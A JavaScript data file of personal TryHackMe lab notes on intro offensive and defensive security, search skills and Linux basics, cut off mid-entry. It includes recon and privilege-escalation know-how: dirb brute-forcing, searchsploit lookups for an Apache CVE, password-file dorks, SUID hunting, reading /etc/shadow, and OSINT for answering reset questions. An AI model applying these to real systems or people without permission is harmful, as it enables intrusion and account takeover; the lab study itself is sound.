/* ═══════════════════════════════════════════════════════
   PRIVATE VAULT — TryHackMe Lab Notes
   Author: Prit Gujarati
   Purpose: Personal revision & deep recall
   ═══════════════════════════════════════════════════════ */

export const VAULT_ROOMS = [

  // ─────────────────────────────────────────────────────────
  {
    id: "offensive-security-intro",
    title: "Offensive Security Intro",
    platform: "TryHackMe",
    category: "Web Security",
    difficulty: "Easy",
    icon: "⚔️",
    completed: true,
    tags: ["dirb", "Brute Force", "Web Enumeration", "Ethical Hacking"],
    overview:
      "Understand what offensive security means and experience it hands-on by hacking a fake banking application called FakeBank. The goal is to find hidden pages using directory brute-forcing and exploit them — all in a legal, safe lab environment.",
    keyLearnings: [
      "Offensive security = simulating attacker techniques to find and fix vulnerabilities before real attackers do",
      "Red Teams and Penetration Testers are the professionals who perform offensive security",
      "Applications often expose sensitive functionality through secret, undocumented URLs",
      "dirb uses a wordlist to brute-force URL paths and discover hidden pages",
      "Always have written legal permission before testing any real system — without it, it is a crime",
    ],
    tasks: [
      {
        num: 1,
        title: "What is Offensive Security?",
        notes: `DEFINITION — Offensive Security:
The practice of proactively breaking into computer systems, exploiting software bugs, and finding loopholes in applications — with the goal of understanding attacker techniques so that defences can be improved.

Core principle: "To outsmart a hacker, you need to think like one."

Two sides of cybersecurity:
• Offensive Security → finds vulnerabilities (Red Team / Penetration Testers)
• Defensive Security → prevents and responds to attacks (Blue Team / SOC)

Offensive security is NOT about causing damage — it is about discovering weaknesses before malicious attackers do, and reporting them so they can be fixed.`,
        commands: [],
        answer: null,
      },
      {
        num: 2,
        title: "Starting the Lab — FakeBank",
        notes: `LAB SETUP:
TryHackMe provides a Virtual Machine (VM) — a simulated computer running inside the browser. The VM hosts a fake banking application called FakeBank.

The lab is split-screen:
  Left side  → Room instructions
  Right side → The deployed virtual machine

Why use VMs for labs?
• Isolated and safe — changes don't affect your real computer
• Can be reverted to original state at any time
• Simulates real-world target environments

Your role: You are a regular FakeBank user trying to find and exploit vulnerabilities.`,
        commands: [],
        answer: null,
      },
      {
        num: 3,
        title: "Directory Brute-Forcing with dirb",
        notes: `CONCEPT — Hidden URLs / Forced Browsing:
Web applications sometimes have pages not linked anywhere on the site. Developers sometimes leave admin panels, deposit pages, or debug tools accessible via a direct URL — this is a security misconfiguration.

TOOL — dirb:
dirb is a web content scanner that takes a wordlist and tries each word as a URL path.

HOW dirb WORKS — Step by Step:
1. Give dirb a base URL (e.g. http://fakebank.thm)
2. dirb loads a wordlist — default: /usr/share/dirb/wordlists/common.txt
3. Tries every word as a URL path → http://fakebank.thm/admin, /images, etc.
4. If server returns HTTP 200 (OK) → page EXISTS
5. dirb reports found URLs with a + sign

READING dirb OUTPUT:
  + http://fakebank.thm/bank-deposit (CODE:200|SIZE:4663)
    → CODE:200 means the page exists and loaded successfully
    → SIZE:4663 means the page is 4663 bytes
  + http://fakebank.thm/images (CODE:301|SIZE:179)
    → CODE:301 means the server redirected

WHY THIS WORKS:
People use predictable names — "admin", "login", "upload", "backup", "deposit". common.txt contains thousands of these predictable names.`,
        commands: [
          "dirb http://fakebank.thm",
          "// Syntax: dirb <URL>",
          "// Optional: dirb <URL> <custom-wordlist>",
          "// Default wordlist: /usr/share/dirb/wordlists/common.txt",
        ],
        answer: null,
      },
      {
        num: 4,
        title: "Exploiting the Hidden Page",
        notes: `WHAT HAPPENED:
After finding /bank-deposit via dirb, navigating directly to it revealed a deposit page with no authorization check — any user can abuse it.

VULNERABILITY TYPE — Broken Access Control (OWASP Top 10):
Exposing functionality as a public URL without proper auth is a critical misconfiguration.

LESSON:
Security through obscurity is NOT security. A brute-force tool like dirb finds any page regardless of whether it is linked.

REAL-WORLD IMPACT:
• Transfer funds fraudulently
• Access admin functionality
• Modify records without permission`,
        commands: [
          "// After finding the page, navigate to it directly:",
          "// http://fakebank.thm/bank-deposit",
        ],
        answer: null,
      },
    ],
    tools: ["dirb"],
    mitre: [
      "T1595.003 — Active Scanning: Wordlist Scanning",
      "T1190 — Exploit Public-Facing Application",
    ],
    personalNotes:
      "Core insight: never assume a page is hidden just because it isn't linked. Always run dirb or gobuster on any web target. The /usr/share/dirb/wordlists/ directory has multiple wordlists — common.txt is a start, big.txt finds more.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "defensive-security-intro",
    title: "Defensive Security Intro",
    platform: "TryHackMe",
    category: "Incident Response",
    difficulty: "Easy",
    icon: "🛡️",
    completed: true,
    tags: ["SOC", "DFIR", "Malware Analysis", "Threat Intelligence", "SIEM", "Blue Team"],
    overview:
      "Introduction to the defensive side of cybersecurity. Covers the role of the Blue Team, how a Security Operations Center (SOC) works, Threat Intelligence, Digital Forensics and Incident Response (DFIR), and types of malware. Ends with a hands-on SIEM alert investigation simulation.",
    keyLearnings: [
      "Defensive security = preventing intrusions AND detecting + responding when they occur",
      "SOC monitors 24/7 across 4 areas: vulnerabilities, policy violations, unauthorized activity, network intrusions",
      "Threat Intelligence collects adversary data to enable threat-informed defence",
      "DFIR covers: file system, memory, system logs, network logs",
      "Incident Response: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident",
      "Malware types: Virus (spreads/damages), Trojan (disguised), Ransomware (encrypts/ransoms)",
      "Static analysis = inspect without running | Dynamic = run in a sandbox",
    ],
    tasks: [
      {
        num: 1,
        title: "Introduction to Defensive Security",
        notes: `DEFINITION — Defensive Security:
Concerned with two primary objectives:
  1. PREVENTING intrusions from occurring in the first place
  2. DETECTING intrusions when they happen and RESPONDING properly

KEY DEFENSIVE TASKS:
1. User Cyber Security Awareness Training → Most attacks target humans via phishing
2. Asset Management → You cannot protect what you don't know exists
3. Patching and Updates → Known CVEs are public — attackers scan for unpatched systems
4. Preventative Security Devices → Firewall + IPS
5. Logging and Monitoring → SIEM collects and correlates logs`,
        commands: [],
        answer: null,
      },
      {
        num: 2,
        title: "SOC and Threat Intelligence",
        notes: `SOC FOCUS AREAS:
1. VULNERABILITIES → patch or mitigate immediately when discovered
2. POLICY VIOLATIONS → employee uploads confidential data to personal cloud
3. UNAUTHORIZED ACTIVITY → attacker steals credentials and logs in
4. NETWORK INTRUSIONS → detect as fast as possible to minimize damage

THREAT INTELLIGENCE PROCESS:
  1. DATA COLLECTION — local (network logs) + public (threat feeds, forums)
  2. DATA PROCESSING — normalize raw data into usable format
  3. ANALYSIS — identify attacker TTPs (Tactics, Techniques, Procedures)

ADVERSARY EXAMPLES:
  • Nation-state actor → political espionage, critical infrastructure
  • Ransomware group  → financial motivation, targets hospitals/businesses
  • Hacktivist group  → ideological motivation, website defacement`,
        commands: [],
        answer: null,
      },
      {
        num: 3,
        title: "DFIR and Malware Analysis",
        notes: `FOUR KEY FORENSIC AREAS:
1. FILE SYSTEM — analyze forensic image (bit-for-bit copy) with Autopsy/FTK
2. SYSTEM MEMORY (RAM) — fileless malware runs in memory only; use Volatility
3. SYSTEM LOGS — Linux: /var/log/ | Windows: Event Viewer
4. NETWORK LOGS — PCAP captures with Wireshark, tcpdump

INCIDENT RESPONSE — 4 PHASES:
  Phase 1 — PREPARATION: train IR team, create playbooks, deploy detection tools
  Phase 2 — DETECTION AND ANALYSIS: identify incident, determine scope
  Phase 3 — CONTAINMENT, ERADICATION, RECOVERY: isolate → remove → restore
  Phase 4 — POST-INCIDENT ACTIVITY: report, lessons learned, update controls

MALWARE TYPES:
  VIRUS → attaches to programs, spreads, requires user action
  TROJAN → looks legitimate, hides malicious functionality, no self-replication
  RANSOMWARE → encrypts files, demands payment (offline backups = best defence)

ANALYSIS APPROACHES:
  STATIC  → inspect binary WITHOUT running it; requires assembly knowledge
  DYNAMIC → run malware inside a sandbox; monitor files, network, processes`,
        commands: [],
        answer: null,
      },
      {
        num: 4,
        title: "Practical — SIEM Alert Investigation",
        notes: `SIEM = Security Information and Event Management
• COLLECTS logs from firewalls, servers, endpoints, applications
• NORMALIZES data into common format
• CORRELATES events across sources to detect patterns
• GENERATES ALERTS when suspicious activity is detected

SOC ANALYST INVESTIGATION WORKFLOW:
  Step 1 — Alert Triage: real threat or false positive?
  Step 2 — Investigation: examine source IP, destination, timestamp, user
  Step 3 — Correlation: multiple related alerts tell a story
  Step 4 — Escalation or Resolution: escalate to IR or close as false positive

CORRELATION EXAMPLE:
  failed logins + successful login from foreign IP + large data transfer = likely breach`,
        commands: [],
        answer: null,
      },
    ],
    tools: ["SIEM"],
    mitre: [
      "T1078 — Valid Accounts (Unauthorized Activity)",
      "T1486 — Data Encrypted for Impact (Ransomware)",
      "T1027 — Obfuscated Files or Information (Fileless Malware)",
    ],
    personalNotes:
      "Mental model: SOC = watchtower, Threat Intel = intelligence agency, DFIR = forensics team at the crime scene. The 4 IR phases are exam-critical — memorise the order cold: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "search-skills",
    title: "Search Skills",
    platform: "TryHackMe",
    category: "OSINT",
    difficulty: "Easy",
    icon: "🔍",
    completed: true,
    tags: ["OSINT", "Google Dorking", "Shodan", "CVE", "VirusTotal", "HIBP", "Exploit DB"],
    overview:
      "Learn to efficiently search the internet and extract valuable information using search operators, specialized search engines, vulnerability databases, technical documentation, and social media. Fundamental for both offensive reconnaissance and defensive threat intelligence.",
    keyLearnings: [
      "Evaluate sources by: authority, evidence quality, objectivity, corroboration",
      "Snake oil = a cryptographic product/method that is bogus or fraudulent",
      "Google operators: \"phrase\", site:, -, filetype: for surgical searching",
      "Shodan finds internet-connected devices by banner/version/port",
      "Censys focuses on hosts, websites, and TLS certificates",
      "VirusTotal scans files and URLs against 70+ antivirus engines",
      "Have I Been Pwned checks email addresses against known data breaches",
      "CVE = standardized ID for known vulnerabilities (format: CVE-YEAR-NUMBER)",
      "Exploit Database = searchable working exploit code for known CVEs",
      "ss = socket statistics, replaces netstat in modern Linux",
    ],
    tasks: [
      {
        num: 1,
        title: "Evaluating Search Results",
        notes: `4 CRITERIA FOR EVALUATING A SOURCE:
1. SOURCE / AUTHORITY → Who wrote this? What are their credentials?
2. EVIDENCE AND REASONING → Are claims backed by concrete evidence?
3. OBJECTIVITY AND BIAS → Is the author trying to sell something?
4. CORROBORATION AND CONSISTENCY → Verify from 2-3 independent sources?

TERM — Snake Oil:
   → In cryptography: a product claiming security but actually bogus/fraudulent
   → Red flag: any "unbreakable" proprietary encryption that won't explain itself
   → Real cryptography is peer-reviewed and publicly auditable`,
        commands: [],
        answer: null,
      },
      {
        num: 2,
        title: "Search Engines and Google Operators",
        notes: `GOOGLE SEARCH OPERATORS:
1. "EXACT PHRASE" → finds specific technical terms, error messages
2. site:domain.com → search within a specific company's site
3. - (Minus) → exclude terms to filter out irrelevant results
4. filetype: → find specific file types (pdf, doc, xls, txt, csv)

GOOGLE DORKING (combining operators):
   Example: filetype:xls site:gov password
   → Finds Excel files on government sites containing "password"
   → Powerful passive recon technique

LINUX COMMAND — ss:
   → "socket statistics" — modern replacement for netstat`,
        commands: [
          'filetype:pdf cyber warfare report',
          '"passive reconnaissance"',
          'site:tryhackme.com walkthroughs',
          'linux hardening -ubuntu',
          'ss',
          'ss -tulnp         // show TCP/UDP listening ports with process names',
          'ss -an            // all connections, numeric format',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Specialized Search Engines",
        notes: `SHODAN (shodan.io):
A search engine for internet-connected devices — indexes device BANNERS.
• Scans the internet on common ports (80, 443, 22, 21, 3389)
• Indexes by port, protocol, product, version, country, organization
• Defenders: find your own exposed assets before attackers do

CENSYS (censys.io):
Focuses on internet hosts, websites, TLS/SSL certificates
• Find all subdomains via TLS certificate data
• Discover shadow IT assets the company doesn't know about

VIRUSTOTAL (virustotal.com):
Scans files and URLs against 70+ antivirus engines simultaneously
• Enter a file hash without uploading — results are cached
• "3/68 detected" = could be false positive
• "52/68 detected" = almost certainly malicious

HAVE I BEEN PWNED (haveibeenpwned.com):
Checks whether an email appears in known data breaches
• Credential stuffing: attackers try leaked credentials on other services
• Password reuse across sites = one breach exposes many accounts`,
        commands: [
          '// Shodan search examples:',
          'apache 2.4.1',
          'port:22 country:IN',
          'product:"MySQL" version:"5.7"',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "CVE and Exploit DB",
        notes: `CVE — COMMON VULNERABILITIES AND EXPOSURES:
ID FORMAT: CVE-YEAR-NUMBER  (e.g. CVE-2024-29988)
• Maintained by MITRE Corporation
• NVD (NIST) adds CVSS severity scores (0-10)
• Contains: description, affected versions, CVSS score, patch references

WORKFLOW — FROM CVE TO EXPLOITATION:
  1. Scan target for software versions (nmap, whatweb)
  2. Search those versions in CVE database
  3. Find CVEs with high CVSS scores
  4. Check if target is patched
  5. If unpatched → search Exploit DB for working exploit code

NOTABLE EXAMPLE — CVE-2014-0160 (Heartbleed):
  → Vulnerability in OpenSSL's heartbeat extension
  → Allowed reading up to 64KB of server memory per request
  → Exposed private keys, passwords, session tokens

EXPLOIT DATABASE (exploit-db.com):
Public archive of exploit code (proof-of-concept) for known vulnerabilities
searchsploit = CLI version, pre-installed on Kali Linux`,
        commands: [
          'searchsploit apache 2.4.49',
          'searchsploit -m 50383       // copy exploit to current directory',
          'searchsploit --cve 2021-41773',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "Technical Documentation and Man Pages",
        notes: `LINUX MAN PAGES: man <command>  or  <command> --help

NAVIGATING MAN PAGES:
  ↓ / ↑ Arrow keys  → scroll line by line
  Space / PgDn       → scroll one full page
  /search_term       → search within the man page
  n                  → next search result
  q                  → quit

KEY LINUX COMMANDS:
  cat → "concatenate" — outputs file contents
  ss  → "socket statistics" — shows network connections (replaces netstat)
  ip  → shows/manipulates network interfaces (replaces ifconfig)

WINDOWS COMMANDS:
  ipconfig          → shows IP configuration for all interfaces
  ipconfig /all     → detailed info including MAC address, DNS
  netstat -b        → shows EXECUTABLE associated with each connection/port
  netstat -an       → all connections in numeric format`,
        commands: [
          'man ls',
          'man ssh',
          'man grep',
          'ls --help',
          'ss -tulnp',
          'ip addr show',
          'netstat -b        // Windows: show executable per connection',
        ],
        answer: null,
      },
      {
        num: 6,
        title: "Social Media for OSINT",
        notes: `OSINT = Open Source Intelligence — information from publicly available sources

LINKEDIN:
  Best for: Professional and technical background
  Reveals: Job title, skills, tech stack from job requirements
  Use: Map the IT/security team of a target organization

FACEBOOK:
  Best for: Personal information
  Reveals: School, hometown, family, hobbies
  Use: Finding answers to password reset secret questions
  → Enables account takeover without any technical attack — pure social engineering

OPSEC NOTE:
  → Use a separate account — not your real identity
  → LinkedIn notifies the target when someone views their profile
  → Use incognito mode to reduce traceability`,
        commands: [],
        answer: null,
      },
    ],
    tools: ["Shodan", "Censys", "VirusTotal", "Have I Been Pwned", "Exploit Database", "searchsploit"],
    mitre: [
      "T1593 — Search Open Websites/Domains",
      "T1596 — Search Open Technical Databases",
      "T1597 — Search Closed Sources",
    ],
    personalNotes:
      "filetype: operator is one of the most powerful passive recon tools. searchsploit is faster than browsing exploit-db.com from a terminal. HIBP check should be standard practice when assessing any organization.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "linux-fundamentals-1",
    title: "Linux Fundamentals Part 1",
    platform: "TryHackMe",
    category: "Linux",
    difficulty: "Easy",
    icon: "🐧",
    completed: true,
    tags: ["Linux", "CLI", "Filesystem", "grep", "find", "Shell Operators", "Ubuntu"],
    overview:
      "Introduction to Linux — its history, distributions, and how to interact with it through the terminal. Learn essential filesystem commands (ls, cd, cat, pwd), how to search efficiently (find, grep), and how to control output with shell operators (&, &&, >, >>).",
    keyLearnings: [
      "Linux first released 1991 — powers websites, cars, ATMs, supercomputers, Android",
      "echo outputs text; whoami shows the current logged-in user",
      "ls = list, cd = navigate, cat = view file, pwd = print full current path",
      "find -name searches by filename recursively; * wildcard finds by pattern",
      "grep searches file CONTENTS for a value; grep -R searches recursively across directories",
      "& = background | && = chain (second only runs if first succeeds) | > = overwrite | >> = append",
    ],
    tasks: [
      {
        num: 1,
        title: "Background on Linux",
        notes: `WHERE LINUX IS USED:
• Web servers (most of the internet runs on Linux)
• Android phones (built on the Linux kernel)
• Smart cars, Point of Sale systems, critical infrastructure
• 100% of the top 500 supercomputers
• Cloud computing (AWS, GCP, Azure VM workloads)

KEY LINUX DISTRIBUTIONS (DISTROS):
  Ubuntu/Debian  → general purpose, beginner-friendly
  Kali Linux     → pre-loaded with hacking tools, used by pentesters
  CentOS/RHEL    → enterprise server environments
  Alpine         → ultra-lightweight, used inside Docker containers

FIRST RELEASE: 1991 by Linus Torvalds`,
        commands: [],
        answer: null,
      },
      {
        num: 2,
        title: "Running Your First Commands",
        notes: `COMMAND: echo — Output any text to the terminal screen
  Single word → no quotes: echo Hello
  Multiple words → use double quotes: echo "Hello Friend!"
  Display variables: echo $HOME  or  echo $USER
  Write to files: echo "hello" > file.txt

COMMAND: whoami — Displays the username of the currently logged-in user
  WHY THIS MATTERS IN SECURITY:
  → After gaining access, first question is "who am I?"
  → Determines privilege level: regular user or root?
  → Root = full control of the system`,
        commands: [
          'echo Hello',
          'echo "Hello Friend!"',
          'echo $HOME       // prints home directory path',
          'echo $USER       // prints current username',
          'whoami',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Filesystem Commands — ls, cd, cat, pwd",
        notes: `ls (list):
  ls              → list current directory
  ls /path/dir    → list a specific directory without navigating to it
  NOTE: Does NOT show hidden files — use ls -a

cd (change directory):
  cd Pictures         → navigate INTO Pictures
  cd ..               → go up one level (parent directory)
  cd ~                → navigate to your home directory
  Absolute: /home/tryhackme/Documents (starts with /)
  Relative: Documents/notes.txt (starts from current location)

cat (concatenate):
  → Output file contents to the terminal
  → Security use cases: cat /etc/passwd, cat /var/log/auth.log

pwd (print working directory):
  → Displays the FULL absolute path of your current directory
  → Critical when writing scripts that need absolute paths`,
        commands: [
          'ls', 'ls /var/log', 'ls Pictures',
          'cd Documents', 'cd ..', 'cd /home/tryhackme/folder4', 'cd ~',
          'cat todo.txt', 'cat /etc/passwd', 'pwd',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "Searching — find and grep",
        notes: `COMMAND: find — Search for FILES AND DIRECTORIES by name, type, size, permissions

  find -name passwords.txt        → exact filename match
  find -name "*.txt"              → all .txt files (wildcard)
  find / -name passwords.txt      → search ENTIRE filesystem
  find / -type f -perm /4000      → SUID files (key for privilege escalation)
  find / -size +10M               → files larger than 10MB
  find / -name file.txt 2>/dev/null → hide permission errors

COMMAND: grep — Search the CONTENTS of files for a string or pattern
  find locates files by name — grep locates content INSIDE files

  grep "81.143.211.90" access.log    → find lines with that IP
  grep -i "password" config.txt      → case-insensitive
  grep -n "error" logfile.log        → show line numbers
  grep -c "404" access.log           → count matching lines
  grep -v "200" access.log           → show lines that do NOT match
  grep -R "PRETTY_NAME" /etc/        → recursive search across directories`,
        commands: [
          'find -name passwords.txt',
          'find -name "*.txt"',
          'find / -name passwords.txt 2>/dev/null',
          'find / -type f -perm /4000',
          'grep "81.143.211.90" access.log',
          'grep -i "password" config.txt',
          'grep -R "PRETTY_NAME" /etc/',
          'grep -n "error" /var/log/syslog',
          'grep -c "failed" auth.log',
          'grep -v "200" access.log',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "Shell Operators",
        notes: `OPERATOR: & (single ampersand)
  → Run a command in the BACKGROUND — terminal stays usable
  Example: cp large_file /backup/ &

OPERATOR: && (double ampersand)
  → Chain commands — SECOND command only runs if FIRST SUCCEEDS
  Example: mkdir new_folder && cd new_folder

OPERATOR: > (overwrite redirect)
  → Write output to a file — OVERWRITES existing content
  ⚠ WARNING: > DESTROYS existing content — use carefully
  Example: echo "hello" > welcome.txt

OPERATOR: >> (append redirect)
  → Add to END of file — PRESERVES existing content
  Example: echo "world" >> welcome.txt

SUMMARY:
  >   overwrites → DANGEROUS, use carefully
  >>  appends    → safer, preserves history`,
        commands: [
          'cp large_file.iso /backup/ &',
          'mkdir myfolder && cd myfolder',
          'apt update && apt upgrade',
          'echo "hello" > welcome.txt',
          'echo "world" >> welcome.txt',
          'cat welcome.txt',
          'ls > directory_contents.txt',
          'nmap -sV 10.10.10.1 > scan_results.txt',
        ],
        answer: null,
      },
    ],
    tools: ["Terminal (Bash)", "find", "grep"],
    mitre: [],
    personalNotes:
      "grep -R is one of the most used commands in CTFs. The >> vs > distinction is critical — > can wipe important data accidentally. Memorize find -perm /4000 for SUID file hunting during privilege escalation.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "linux-fundamentals-2",
    title: "Linux Fundamentals Part 2",
    platform: "TryHackMe",
    category: "Linux",
    difficulty: "Easy",
    icon: "🐧",
    completed: true,
    tags: ["Linux", "SSH", "Permissions", "chmod", "File Management", "su", "man pages"],
    overview:
      "Advance your Linux knowledge with SSH remote access, command flags and man pages, complete filesystem manipulation (create, copy, move, delete, identify files), the permission system in symbolic and numeric format, user switching with su, and the key root directories.",
    keyLearnings: [
      "SSH encrypts all communication between machines — syntax: ssh user@IP",
      "Flags modify command behaviour — discover with --help or man <command>",
      "touch = create file | mkdir = create directory | rm = delete | cp = copy | mv = move/rename",
      "file <n> identifies true file type regardless of extension",
      "Permissions: rwxrwxrwx = owner/group/others | r=4, w=2, x=1",
      "chmod 755 = rwxr-xr-x | 644 = rw-r--r-- | 600 = rw------- | 777 = rwxrwxrwx",
      "su = switch user (needs their password) | su -l = full login as that user",
      "/etc = system config | /var/log = logs | /root = root home | /tmp = volatile temp storage",
    ],
    tasks: [
      {
        num: 1,
        title: "SSH — Secure Shell",
        notes: `DEFINITION — SSH (Secure Shell):
A cryptographic network protocol for securely connecting to and controlling a remote computer.

HOW SSH WORKS:
  1. Client initiates connection to server on port 22
  2. SSH performs key exchange to establish encrypted communication
  3. Authenticate (password or SSH key pair)
  4. All subsequent communication is encrypted end-to-end

BEFORE SSH EXISTED:
  → Telnet sent all data including passwords in PLAINTEXT
  → Anyone sniffing the network could read your credentials

SSH LOGIN SYNTAX: ssh username@IP_ADDRESS
First connection: prompted "Are you sure?" → type yes
Password entry: nothing appears on screen — this is normal

To disconnect: exit  or  Ctrl + D`,
        commands: [
          'ssh tryhackme@MACHINE_IP',
          'ssh -p 2222 user@10.10.10.1',
          'ssh-keygen',
          'ssh-copy-id user@10.10.10.1',
          'exit',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Flags, Switches, and Man Pages",
        notes: `DEFINITION — Flags / Switches:
Additional arguments that modify a command's default behaviour.
  Short flags: single letter, single hyphen  →  ls -a
  Long flags:  full word, double hyphen      →  ls --all

HOW TO DISCOVER FLAGS:
  METHOD 1 — --help: ls --help (concise list, quick reference)
  METHOD 2 — man pages: man ls (full manual, all flags, examples)

NAVIGATING MAN PAGES:
  ↓ / ↑ Arrow keys → scroll | Space → full page | /term → search | q → quit

KEY ls FLAGS:
  ls -a      → show ALL files including hidden (starting with .)
  ls -l      → long format: permissions, owner, size, date
  ls -h      → human-readable sizes (4.0K instead of 4096)
  ls -lh     → long format with human-readable sizes
  ls -la     → long format with hidden files
  ls -R      → recursive listing of all subdirectories`,
        commands: [
          'ls --help', 'man ls', 'man ssh',
          'ls -a', 'ls -lh', 'ls -la', 'ls -R',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Filesystem Commands — Create, Copy, Move, Delete",
        notes: `touch — Create a blank file:
  touch newnote.txt  → Creates empty file; if exists, updates timestamp

mkdir — Create a directory:
  mkdir -p parent/child/grandchild  → creates nested dirs in one command

rm — Delete files or directories:
  rm filename              → delete a single file
  rm -R directory          → delete directory and ALL its contents
  ⚠ Linux has NO recycle bin. rm is PERMANENT and cannot be undone.
  ⚠ NEVER run rm -rf / — this would delete the entire filesystem

cp — Copy files or directories:
  cp note.txt note_backup.txt          → copy with new name
  cp -R myfolder/ myfolder_backup/    → copy entire directory recursively
  The ORIGINAL file remains — cp always creates a new copy.

mv — Move or rename:
  mv file.txt /path/  → MOVE file (original no longer in source)
  mv old.txt new.txt  → RENAME file (mv is how you rename on Linux)

file — Identify true file type:
  Reads actual file header/magic bytes — not the extension
  Malware often disguises itself with a wrong extension`,
        commands: [
          'touch newnote.txt', 'mkdir myfolder', 'mkdir -p projects/web/assets',
          'rm oldfile.txt', 'rm -R old_directory',
          'cp note.txt note_backup.txt', 'cp -R myfolder/ myfolder_backup/',
          'mv file.txt /home/user/Documents/', 'mv oldname.txt newname.txt',
          'file unknown_file', 'file *',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "File Permissions",
        notes: `View with:  ls -lh

Example output:  -rw-r--r-- 1 cmnatic cmnatic 4.0K Feb 19 file1

BREAKDOWN:
  Position 1:     - = regular file | d = directory | l = symbolic link
  Positions 2-4:  rw- = OWNER permissions
  Positions 5-7:  r-- = GROUP permissions
  Positions 8-10: r-- = OTHERS permissions

PERMISSION TYPES:
  r = READ (file: open; directory: list contents)
  w = WRITE (file: modify; directory: create/delete files inside)
  x = EXECUTE (file: run; directory: enter with cd)

NUMERIC SYSTEM:
  r = 4   w = 2   x = 1   - = 0
  rwx = 7  rw- = 6  r-x = 5  r-- = 4  --- = 0

COMMON COMBINATIONS:
  755 → rwxr-xr-x → standard for executables/directories
  644 → rw-r--r-- → standard for regular files
  600 → rw------- → private files (SSH keys)
  700 → rwx------ → private scripts
  777 → rwxrwxrwx → fully open (SECURITY RISK — avoid)`,
        commands: [
          'ls -lh', 'ls -la',
          'chmod 755 script.sh', 'chmod 644 config.txt', 'chmod 600 id_rsa',
          'chmod +x run.sh', 'chown user:group file', 'stat filename',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "Switching Users — su Command",
        notes: `DEFINITION — su (substitute user / switch user):
Allows switching to another user account within an active terminal session.

su user2:
  → Switches to user2's identity
  → Stays in your CURRENT directory
  → Does NOT fully load user2's environment

su -l user2  (also: su - user2):
  → Switches to user2's identity
  → Changes to user2's HOME directory automatically
  → Fully loads user2's environment (PATH, shell variables)
  → PREFERRED method for a clean user switch

BECOMING ROOT:
  su -        → switch to root with full root environment
  sudo su     → become root using YOUR password
  sudo -i     → start a root login shell
  sudo -l     → list commands YOU are allowed to run with sudo`,
        commands: [
          'su user2', 'su -l user2', 'su -',
          'sudo su', 'sudo -i', 'sudo apt install nmap', 'sudo -l', 'id',
        ],
        answer: null,
      },
      {
        num: 6,
        title: "Important Root Directories",
        notes: `/etc — System-wide configuration files:
  /etc/passwd   → All user accounts (readable by everyone)
  /etc/shadow   → Actual password HASHES (root-only readable)
  /etc/sudoers  → Who can run sudo — misconfigs = easy privilege escalation
  /etc/hosts    → Local DNS — checked before real DNS

/var — Variable data (files that change frequently):
  /var/log/auth.log  → SSH logins, su/sudo usage
  /var/log/syslog    → General system messages
  /var/log/apache2/  → Web server access.log + error.log
  /var/backups/      → Automatic backups (may contain sensitive data)

/root — Home directory of the ROOT (superuser) account:
  → Located at /root (NOT at /home/root)
  → Common location for flags in CTFs after privilege escalation

/tmp — Volatile temporary storage:
  → Contents WIPED on every reboot
  → Any user can write here (world-writable)
  → Attackers drop tools/payloads here post-exploitation
  → Check /tmp during incident response for recently dropped files`,
        commands: [
          'ls /etc', 'cat /etc/passwd', 'sudo cat /etc/shadow', 'cat /etc/hosts',
          'ls /var/log', 'cat /var/log/auth.log',
          'tail -f /var/log/apache2/access.log', 'ls /root', 'ls -la /tmp',
        ],
        answer: null,
      },
    ],
    tools: ["SSH", "chmod", "chown", "su", "sudo"],
    mitre: [
      "T1078 — Valid Accounts",
      "T1548.003 — Sudo and Sudo Caching Abuse",
      "T1083 — File and Directory Discovery",
    ],
    personalNotes:
      "/tmp and /etc/passwd are the first two places to check after initial access. The numeric permission system is tested in certs (CompTIA Linux+, RHCSA) — memorise 755/644/600/700. su -l always over su for a clean environment.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "linux-fundamentals-3",
    title: "Linux Fundamentals Part 3",
    platform: "TryHackMe",
    category: "Linux",
    difficulty: "Easy",
    icon: "🐧",
    completed: true,
    tags: ["Linux", "nano", "vim", "Processes", "Cron", "apt", "Logs", "wget", "Python HTTP Server"],
    overview:
      "The final Linux Fundamentals room. Covers terminal text editors, downloading and serving files, managing running processes, automating tasks with cron, package management with apt, and analysing logs in /var/log.",
    keyLearnings: [
      "nano = beginner-friendly editor | vim = powerful, steep learning curve",
      "wget downloads files from web directly to machine",
      "python3 -m http.server starts a file server on port 8000 — used for file transfers in CTFs",
      "ps aux shows every running process | kill <PID> terminates a process",
      "systemctl manages services — start/stop/enable(persist)/disable",
      "Crontab format: MIN HOUR DOM MON DOW COMMAND | * = every | @reboot = on startup",
      "apt update refreshes package index | apt install installs software",
      "/var/log/apache2/access.log records every HTTP request to the web server",
    ],
    tasks: [
      {
        num: 1,
        title: "Terminal Text Editors — nano and vim",
        notes: `NANO — Simple, beginner-friendly terminal text editor:
  Ctrl + O → Save (press Enter to confirm)
  Ctrl + X → Exit
  Ctrl + W → Search within file
  Ctrl + K → Cut current line
  Ctrl + U → Paste (UnCut) the line

VIM — Powerful editor with 3 modes (what confuses beginners):
  NORMAL MODE   → default — navigation, copy, delete, search
  INSERT MODE   → type and edit text (like a normal editor)
  COMMAND MODE  → run vim commands (save, quit)

SWITCHING MODES:
  i     → enter INSERT mode (start typing)
  Esc   → return to NORMAL mode
  :     → enter COMMAND mode from NORMAL mode

ESSENTIAL VIM COMMANDS:
  :w   → save  |  :q → quit  |  :wq → save and quit  |  :q! → quit without saving
  dd   → delete current line  |  yy → copy  |  u → undo`,
        commands: [
          'nano config.txt', 'nano /etc/hosts', 'vim script.py',
          '// Vim quick workflow:',
          '// 1. vim file.txt  2. Press i to enter insert mode',
          '// 3. Edit file  4. Press Esc  5. Type :wq and press Enter',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "wget and Python HTTP Server",
        notes: `wget — Web Get — Downloads files from the internet directly:
  wget https://example.com/file.txt                → download file
